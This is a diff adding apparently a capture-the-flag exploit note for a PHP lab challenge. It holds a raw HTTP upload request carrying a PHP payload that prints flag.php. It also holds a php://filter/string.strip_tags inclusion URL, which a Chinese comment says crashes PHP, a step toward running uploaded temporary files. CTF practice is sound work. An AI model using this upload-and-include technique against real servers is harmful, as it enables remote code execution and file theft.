@@ -1,0 +1,22 @@
+POST /babyphpinfov7/phpinfo.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------9417939141775834208717807850
+Content-Length: 260
+Connection: close
+Cookie: PHPSESSID=09e1deae1da0a95b2515a0c0a9a07c8b
+Upgrade-Insecure-Requests: 1
+
+-----------------------------9417939141775834208717807850
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: application/octet-stream
+
+<?php show_source("flag.php");?>
+-----------------------------9417939141775834208717807850--
+
+
+
+/include.php?file=php://filter/string.strip_tags/resource=index.html 这个让php段错误
